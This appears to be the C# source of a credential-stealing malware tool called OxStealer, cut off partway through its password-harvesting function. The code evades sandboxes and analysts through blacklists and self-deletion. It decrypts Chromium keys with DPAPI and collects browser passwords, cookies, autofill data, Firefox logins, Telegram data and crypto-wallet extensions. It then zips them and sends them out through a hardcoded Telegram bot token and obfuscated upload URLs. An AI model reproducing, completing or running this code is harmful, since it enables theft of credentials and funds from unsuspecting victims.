using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Linq;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using System.Net.WebSockets;
using System.Threading;
using System.Text.RegularExpressions;
using System.IO.Compression;
using System.Net;

namespace AiluV4
{
    internal class Config
    {
        public static string TelegramToken = "8009002136:AAHPJrz2-Pn7ZXvJ8icMhaRHpwMHWNcOutY";
        public static string TelegramChatId = "6871070750";
        public static string User_id = "20";
        public static List<string> BlackListedIPs = new List<string>
        {
            "181.214.153.11", "169.150.197.118", "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69",
            "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12",
            "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199",
            "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114",
            "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173",
            "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", "95.25.81.24", "193.128.114.45",
            "34.138.96.23", "92.211.192.144", "34.85.253.170", "195.181.175.105", "192.87.28.103", "80.211.0.97"
        };

        public static List<string> BlackListedHostnames = new List<string>
        {
            "BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ",
            "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "Q9IATRKPRH", "XC64ZB",
            "SERVER1", "LISA-PC", "JOHN-PC", "WILEYPC", "WORK", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH"
        };

        public static List<string> BlackListedUsernames = new List<string>
        {
            "WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo",
            "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "Frank", "Lisa", "John", "vboxuser",
            "george", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "lbeld", "HEUeRzl"
        };

        public static List<string> BlackListedGPUs = new List<string>
        {
            "Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter",
            "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M",
            "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "VirtualBox Graphics Adapter", "K9SC88UK"
        };

        public static List<string> BlackListedOS = new List<string>
        {
            "Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter",
            "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"
        };

        public static List<string> BlackListedProcesses = new List<string>
        {
            "watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe",
            "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "HTTPDebuggerUI.exe",
            "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "OllyDbg.exe",
            "Wireshark.exe", "httpdebuggerui.exe", "vmwareuser.exe", "wireshark.exe", "vgauthservice.exe",
            "fiddler.exe", "cmd.exe", "vmsrvc.exe", "taskmgr.exe", "x32dbg.exe", "FolderChangesView.exe",
            "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe",
            "ProcessHacker.exe", "ida64.exe", "ksdumperclient.exe", "pestudio.exe", "joeboxcontrol.exe"
        };

        public static List<dynamic> BrowserProfiles = Program.GetBrowserProfiles("chrome")
            .Concat(Program.GetBrowserProfiles("brave"))
            .Concat(Program.GetBrowserProfiles("edge"))
            .Concat(Program.GetBrowserProfiles("yandex"))
            .Concat(Program.GetBrowserProfiles("opera"))
            .Concat(Program.GetBrowserProfiles("vivaldi"))
            .Concat(Program.GetBrowserProfiles("coccoc"))
            .Concat(Program.GetBrowserProfiles("slimjet"))
            .Concat(Program.GetBrowserProfiles("torch"))
            .Concat(Program.GetBrowserProfiles("cent"))
            .Concat(Program.GetBrowserProfiles("comodo"))
            .Concat(Program.GetBrowserProfiles("srware"))
            .Concat(Program.GetBrowserProfiles("ungoogled"))
            .Concat(Program.GetBrowserProfiles("epic"))
            .Concat(Program.GetBrowserProfiles("blisk"))
            .ToList();

        public static Dictionary<string, List<List<string>>> GeckoBrowser = Program.GetExistingGeckoBrowsers();

        public static Dictionary<string, string> walletPaths = new Dictionary<string, string>
        {
            { "Metamask", "Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn" },
            { "Coinbase", "Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad" },
            { "Cara", "Local Extension Settings\\mdjmfdffdcmnoblignmgpommbefadffd" },
            { "BinanceChain", "Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp" },
            { "Phantom", "Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa" },
            { "TronLink", "Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec" },
            { "Ronin", "Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec" },
            { "Exodus", "Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno" },
            { "Coin98", "Local Extension Settings\\aeachknmefphepccionboohckonoeemg" },
            { "Authenticator", "Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai" },
            { "MathWallet", "Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc" },
            { "YoroiWallet", "Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb" },
            { "Wombat", "Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih" },
            { "EVERWallet", "Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk" },
            { "KardiaChain", "Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk" },
            { "XDEFI", "Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf" },
            { "Nami", "Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo" },
            { "TerraStation", "Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp" },
            { "MartianAptos", "Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk" },
            { "TON", "Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd" },
            { "Keplr", "Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap" },
            { "CryptoCom", "Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj" },
            { "PetraAptos", "Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci" },
            { "OKX", "Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge" },
            { "Sender", "Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg" },
            { "Sui", "Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil" },
            { "SuietSui", "Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd" },
            { "Braavos", "Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma" },
            { "FewchaMove", "Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj" },
            { "ArgentX", "Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb" },
            { "iWallet", "Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj" },
            { "OxyGenAtomicWallet", "Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh" },
            { "PaliWallet", "Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn" },
            { "MaiarDeFiWallet", "Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm" },
            { "TempleWallet", "Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc" }
        };

    }


    internal class Program
    {
        static async Task Main(string[] args)
        {
            var ipInfo = await GetIP();
            CheckBlackListedIP(ipInfo[0]);
            if (ipInfo[1] == "VN")
            {
                //SelfDelete();
                //Environment.Exit(0);
            }
            string[][] systemInfo = GetSystemInfo();
            //CheckSystemInfo(systemInfo);
            string bulbasaur = "12345678901234567890123456789012"; 
            string ivysaur = "fOWlUAcnRe9mzx2vOfqX4gRsIBJzQjMbUk07a/K/QbMKTa1XE5jCp5Rga6oy+ktRwKkIe1eUE9iBl6LFR2+F/g==";
            string pikachu = "PYP9Pahr1V/Xow2vWlokVveTCQH3LjFlRYYOZ7hU8MAXoNIMPggZp0JQ7sAaowiggfu+lcRo/tfc591AxQf2SQ==";
            string raichu = "OIHPl+kCbk4p439T9v1/l6W7WOJ2tcy4";
            string squirtle = "Q1XLQL4Te5TjUxCCpkUuVq6y1WbGOkescGrFVXwKolC07ARcSysVBsrfMqGeOebjv8sOjyA7m+UWfxKW+mjS2w==";
            string turtoise = "4L46dS+H3J2TlFA0O5n63Tp5sWC5mhZ5";
            string monekey = "FBaqDnpj9McxLRGWHL7lYt0s9YEU547MjeQCzJ2Sa+V7fACmENU1BRrjgCOO8efz";
            string primeape = "qVFE0yE6XBBRpPM3l3lJR8SFM8SZ1fF8";
            string charmander = "Ojh8Y3veFRxgCE3t1bSoB49OrjfDB5Ra";
            string charmeleon = "Ob4OYPq1MQI6tx9eAlWOJIU3h6LMyeXgPEAEZq1L6J1kYuPYsYBqVXuGkSlE7eol";
            string dragonite = "iwm6VRMhQ5toN7/OvCwFgH49ZNWgLJevWxvOSI1LCddH1vmRvq5l7XheYk0L5aoM";
            string dragonair = "T4sfft5Kq2H1uoMEBqfY+NyEphoFvHVz";
            string vaitro = await GetRole(DecryptString(ivysaur, bulbasaur));
            if (vaitro != "4") {
                SelfDelete();
                Environment.Exit(0);
            }
            var WP = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "OxStea");
            if (!Directory.Exists(WP))
            {
                Directory.CreateDirectory(WP);
            }

            string dxDiagInfo = GetDxDiagInfo();
            string inform_path = Path.Combine(WP, "Information.txt");
            using (StreamWriter writer = new StreamWriter(inform_path))
            {
                writer.WriteLine("──────────────────────────────────────────────────────────────────────────────");
                writer.WriteLine("|░█████╗░██╗░░██╗  ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░|");
                writer.WriteLine("|██╔══██╗╚██╗██╔╝  ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗|");
                writer.WriteLine("|██║░░██║░╚███╔╝░  ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝|");
                writer.WriteLine("|██║░░██║░██╔██╗░  ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗|");
                writer.WriteLine("|╚█████╔╝██╔╝╚██╗  ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║|");
                writer.WriteLine("|░╚════╝░╚═╝░░╚═╝  ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝|");
                writer.WriteLine("───────────────────────────── TG: @Ailurophilevn ────────────────────────────");
                writer.WriteLine();
                writer.WriteLine("IP Information:");
                writer.WriteLine($"IP: {ipInfo[0]}");
                writer.WriteLine($"Country Code: {ipInfo[1]}");
                writer.WriteLine();
                writer.WriteLine("──────────────────────────────");
                writer.WriteLine("System Information:");
                foreach (var info in systemInfo)
                {
                    writer.WriteLine(string.Join(", ", info));
                }
                writer.WriteLine("──────────────────────────────");
                writer.WriteLine("Browser Profiles:");

                HashSet<string> browserNames = new HashSet<string>();
                foreach (var profile in Config.BrowserProfiles)
                {
                    string rootPath = profile.root_path;
                    string browserName = Path.GetFileNameWithoutExtension(rootPath);
                    if (browserNames.Add(browserName))
                    {
                        writer.WriteLine(browserName);
                    }
                }
                writer.WriteLine("──────────────────────────────");
                writer.WriteLine("Full information:");
                writer.WriteLine(dxDiagInfo);
                writer.WriteLine();

            };
            int TotalPassword = GetPasswords(WP, pikachu,raichu);
            int TotalAutofill = GetAutofill(WP,DecryptString(squirtle,turtoise));
            int TotalCookie = await GetCookie(WP);
            await UploadKeyFilesAsync(DecryptString(charmeleon,charmander));
            int TotalPasswordGecko = await UploadLoginsAsync(WP,DecryptString(monekey,primeape));
            int TotalCookieGecko = await UploadCookiesAsync(WP,DecryptString(dragonite,dragonair));
            int result = GetTLG(WP);
            int totalWallet = GetWallet(WP);
            string zipFilename = $"[{ipInfo[1]}][{ipInfo[0].Replace(":", ".")}][{DateTime.Now:dd-MM-yy}].zip";
            MakeTheRain(WP,zipFilename);
            string detailofbot = $"OxStealer - @Ailurophilevn\nCountry: {ipInfo[1]}\nIP: {ipInfo[0]}\nChromium Passwords: {TotalPassword}\nChromium Cookies: {TotalCookie}\nChromium Autofill: {TotalAutofill}\nGecko Passwords: {TotalPasswordGecko}\nGecko Cookies: {TotalCookieGecko}\nTelegram: {result}\nCrypto Wallet Extension: {totalWallet}\nGood luck - https://ailurophilestealer.com";
            await SyncWithMe(Config.TelegramToken,Config.TelegramChatId, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), zipFilename), detailofbot);
            DeletePath(WP);
            DeletePath(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), zipFilename));
            SelfDelete();
        }

        public static List<dynamic> GetBrowserProfiles(string browserName)
        {
            var profiles = new List<dynamic>();
            string userDataPath = string.Empty;
            string rootPath = string.Empty;
            string localStatePath = string.Empty;

            switch (browserName.ToLower())
            {
                case "chrome":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data");
                    rootPath = "C:/Program Files/Google/Chrome/Application/chrome.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "brave":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser", "User Data");
                    rootPath = "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "edge":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge", "User Data");
                    rootPath = "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "yandex":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex", "YandexBrowser", "User Data");
                    rootPath = "C:/Program Files (x86)/Yandex/YandexBrowser/Application/browser.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "opera":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Opera Software", "Opera Stable");
                    rootPath = "C:/Program Files/Opera/launcher.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "vivaldi":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi", "User Data");
                    rootPath = "C:/Program Files/Vivaldi/Application/vivaldi.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "coccoc":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CocCoc", "Browser", "User Data");
                    rootPath = "C:/Program Files/CocCoc/Browser/Application/browser.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "slimjet":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Slimjet", "User Data");
                    rootPath = "C:/Program Files/Slimjet/slimjet.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "torch":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Torch", "User Data");
                    rootPath = "C:/Program Files (x86)/Torch/torch.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "cent":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser", "User Data");
                    rootPath = "C:/Program Files (x86)/CentBrowser/Application/chrome.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "comodo":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Comodo", "Dragon", "User Data");
                    rootPath = "C:/Program Files/Comodo/Dragon/dragon.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "srware":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SRWare Iron", "User Data");
                    rootPath = "C:/Program Files/SRWare Iron/iron.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "ungoogled":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Ungoogled Chromium", "User Data");
                    rootPath = "C:/Program Files/Ungoogled Chromium/chrome.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "epic":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Epic Privacy Browser", "User Data");
                    rootPath = "C:/Program Files/Epic Privacy Browser/epic.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                case "blisk":
                    userDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Blisk", "User Data");
                    rootPath = "C:/Program Files/Blisk/Application/blisk.exe";
                    localStatePath = Path.Combine(userDataPath, "Local State");
                    break;
                default:
                    throw new ArgumentException("Unsupported browser");
            }

            string decryptedKey = GetDecryptedKey(localStatePath);

            if (Directory.Exists(userDataPath))
            {
                var directories = Directory.GetDirectories(userDataPath, "Profile *").ToList();
                directories.Insert(0, Path.Combine(userDataPath, "Default")); 

                foreach (var dir in directories)
                {
                    string profileName = Path.GetFileName(dir);

                    profiles.Add(new
                    {
                        profile_path = dir,
                        root_path = rootPath,
                        key = decryptedKey,
                        profile = new List<dynamic>
                {
                    new { profile_name = profileName }
                }
                    });
                }
            }

            return profiles;
        }

        private static string GetDecryptedKey(string localStatePath)
        {
            if (!File.Exists(localStatePath))
            {
                return null;
            }

            try
            {
                var c = File.ReadAllText(localStatePath, Encoding.UTF8);
                if (!c.Contains("os_crypt"))
                {
                    return null;
                }
                var localState = JsonDocument.Parse(c).RootElement;
                var osCrypt = localState.GetProperty("os_crypt");
                var encryptedKey = Convert.FromBase64String(osCrypt.GetProperty("encrypted_key").GetString());
                encryptedKey = SubArray(encryptedKey, 5, encryptedKey.Length - 5);
                var decryptedKey = Decrypt(encryptedKey);
                if (decryptedKey != null)
                {
                    return BitConverter.ToString(decryptedKey).Replace("-", "").ToLower();
                }
                else
                {
                }
            }
            catch (Exception ex)
            {
            }

            return null;
        }
        private static byte[] SubArray(byte[] data, int index, int length)
        {
            byte[] result = new byte[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        private static byte[] Decrypt(byte[] encryptedData)
        {
            var dataIn = new DATA_BLOB();
            var dataOut = new DATA_BLOB();
            var optionalEntropy = new DATA_BLOB();
            var promptStruct = new CRYPTPROTECT_PROMPTSTRUCT
            {
                cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };

            try
            {
                dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
                dataIn.cbData = encryptedData.Length;
                Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);
                if (CryptUnprotectData(ref dataIn, null, ref optionalEntropy, IntPtr.Zero, ref promptStruct, 0, ref dataOut))
                {
                    var decryptedData = new byte[dataOut.cbData];
                    Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);
                    return decryptedData;
                }
            }
            finally
            {
                if (dataIn.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataIn.pbData);
                }
                if (dataOut.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataOut.pbData);
                }
            }
            return null;
        }

        [DllImport("c"+"ry"+"pt3"+"2.d"+"ll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            StringBuilder ppszDataDescr,
            ref DATA_BLOB pOptionalEntropy,
            IntPtr pvReserved,
            ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
            int dwFlags,
            ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }
        public static async Task<string> GetRole(string earth)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    earth = earth + Config.User_id;
                    var response = await client.GetStringAsync(earth);
                    using (JsonDocument document = JsonDocument.Parse(response))
                    {
                        var root = document.RootElement;
                        if (root.TryGetProperty("role", out JsonElement roleElement))
                        {
                            return roleElement.GetString();
                        }
                        else if (root.TryGetProperty("error", out JsonElement errorElement))
                        {
                            Environment.Exit(0);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Environment.Exit(0);
                }
            }
            return null;
        }
        private static string GetDxDiagInfo()
        {
            string dxDiagOutputPath = Path.Combine(Path.GetTempPath(), "dxdiag.txt");

            ProcessStartInfo processStartInfo = new ProcessStartInfo("dxdiag")
            {
                Arguments = $"/t {dxDiagOutputPath}",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processStartInfo))
            {
                process.WaitForExit();
            }

            return File.ReadAllText(dxDiagOutputPath);
        }
        public static void CheckSystemInfo(string[][] systemInfo)
        {
            foreach (var info in systemInfo)
            {
                if (info.Length == 1)
                {
                    CheckAgainstBlacklists(info[0]);
                }
                else
                {
                    foreach (var process in info)
                    {
                        CheckAgainstBlacklists(process);
                    }
                }
            }
        }
        public static void CheckAgainstBlacklists(string info)
        {
            if (Config.BlackListedHostnames.Contains(info))
            {
                SelfDelete();
                Environment.Exit(0);
            }
            else if (Config.BlackListedUsernames.Contains(info))
            {
                SelfDelete();
                Environment.Exit(0);
            }
            else if (Config.BlackListedGPUs.Contains(info))
            {
                SelfDelete();
                Environment.Exit(0);
            }
            else if (Config.BlackListedOS.Contains(info))
            {
                SelfDelete();
                Environment.Exit(0);
            }
            else if (Config.BlackListedProcesses.Contains(info))
            {
                SelfDelete();
                Environment.Exit(0);
            }
        }
        public static string[][] GetSystemInfo()
        {
            return new string[][]
                {
                    new string[] { Environment.MachineName },
                    new string[] { Environment.UserName },
                    new string[] { GetOSName() },
                    new string[] { GetGPUName() },
                    GetRunningProcesses().ToArray()
                };
         }
        private static string GetOSName()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var version = Environment.OSVersion;
                var versionString = version.Version.ToString();
                var productName = GetWindowsProductName(version);

                return productName;
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                return "Linux";
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                return "macOS";
            }
            else
            {
                return "Unknown OS";
            }
        }
        private static string GetWindowsProductName(OperatingSystem osVersion)
        {
            if (osVersion.Version.Major == 10 && osVersion.Version.Minor == 0)
            {
                if (osVersion.Version.Build >= 22000)
                {
                    return "Windows 11";
                }
                else if (osVersion.Version.Build >= 19041)
                {
                    return "Windows 10";
                }
                else if (osVersion.Version.Build >= 20348)
                {
                    return "Windows Server 2022 Datacenter";
                }
                else if (osVersion.Version.Build >= 17763)
                {
                    return "Windows Server 2019 Datacenter";
                }
                else if (osVersion.Version.Build >= 14393)
                {
                    return "Windows Server 2016 Datacenter";
                }
            }
            else if (osVersion.Version.Major == 6)
            {
                switch (osVersion.Version.Minor)
                {
                    case 3:
                        return "Windows 8.1";
                    case 2:
                        return "Windows 8";
                    case 1:
                        return "Windows 7";
                    case 0:
                        return "Windows Vista";
                }
            }
            else if (osVersion.Version.Major == 5 && osVersion.Version.Minor == 1)
            {
                return "Windows XP";
            }

            return "Unknown Version";
        }
        private static string GetGPUName()
        {
            string gpuName = "Unknown GPU";
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c wmic path win32_videocontroller get caption",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(startInfo))
                {
                    using (var reader = process.StandardOutput)
                    {
                        string output = reader.ReadToEnd();
                        var lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
                        if (lines.Length > 1)
                        {
                            gpuName = lines[1].Trim();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }

            return gpuName;
        }
        private static List<string> GetRunningProcesses()
        {
            var processList = Process.GetProcesses()
                .Select(p => p.ProcessName + ".exe")
                .ToList();

            processList.Insert(0, "Running Processes:");
            return processList;
        }
        public static async Task<string[]> GetIP()
        {
            using (HttpClient client = new HttpClient())
            {
                var response = await client.GetStringAsync("https://api.myip.com");
                using (JsonDocument document = JsonDocument.Parse(response))
                {
                    var root = document.RootElement;
                    string ip = root.GetProperty("ip").GetString();
                    string countryCode = root.GetProperty("cc").GetString();

                    return new[] { ip, countryCode };
                }
            }
        }
        public static void CheckBlackListedIP(string ip)
        {
            if (Config.BlackListedIPs.Contains(ip))
            {
                SelfDelete();
                Environment.Exit(0);
            }
        }
        public static async Task SyncWithMe(string tokenBot, string chatId, string archivePath, string messageBody, int maxRetries = 10)
        {
            using (var client = new HttpClient())
            {
                for (int i = 0; i < maxRetries; i++)
                {
                    try
                    {
                        using (var form = new MultipartFormDataContent())
                        {
                            form.Add(new StringContent(chatId), "chat_id");
                            form.Add(new StringContent(messageBody), "caption");
                            form.Add(new StringContent("true"), "protect_content");
                            form.Add(new StringContent("true"), "disable_web_page_preview");
                            using (var fileStream = new FileStream(archivePath, FileMode.Open, FileAccess.Read))
                            {
                                var fileContent = new StreamContent(fileStream);
                                form.Add(fileContent, "document", Path.GetFileName(archivePath));
                                var response = await client.PostAsync($"https://api.telegram.org/bot{tokenBot}/sendDocument", form);
                                response.EnsureSuccessStatusCode();
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        if (i == maxRetries - 1)
                        {
                        }
                    }
                }
            }
        }
        public static string EncryptString(string plainText, string key)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key);
                aesAlg.IV = new byte[16];

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }
        public static string DecryptString(string cipherText, string key)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key);
                aesAlg.IV = new byte[16];

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }
        public static void SelfDelete()
        {
            string currentFilePath = Assembly.GetExecutingAssembly().Location;

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                Arguments = $"/C choice /C Y /N /D Y /T 1 & Del \"{currentFilePath}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            };

            Process.Start(startInfo);
            Environment.Exit(0);
        }
        public static int GetPasswords(string workPath, string pikachu, string raichu)
        {
            int totalPasswords = 0;

            bool CopyFile(string src, string dst)
            {
                try
                {
                    File.Copy(src, dst, true);
                }
                catch (Exception ex)
                {
                    return false;
                }
                return true;
            }

            async Task<string> PostDbFileAsync(string dbFilePath, string key, string makesense, string codecode)
            {
                using (var client = new HttpClient())
                {
                    using (var content = new MultipartFormDataContent())
                    {
                        content.Add(new ByteArrayContent(File.ReadAllBytes(dbFilePath)), "dbfile", "passwords.db");
                        var response = await client.PostAsync(DecryptString(makesense, codecode)+key, content);
                        response.EnsureSuccessStatusCode();
                        return await response.Content.ReadAsStringAsync();
                    }
                }
            }

            foreach (var browserInfo in Config.BrowserProfiles)
            {
                string profilePath = browserInfo.profile_path;
                string profileName = browserInfo.profile[0].profile_name;
                string rootPath = browserInfo.root_path;
                string key = browserInfo.key;
                string browserName = Path.GetFileNameWithoutExtension(rootPath).Replace(".exe", "").Replace("_", " ").ToUpper();
                if (!Directory.Exists(profilePath))
                {
                    continue;
                }
                string loginDataPath = Path.Combine(profilePath, "Login Data");
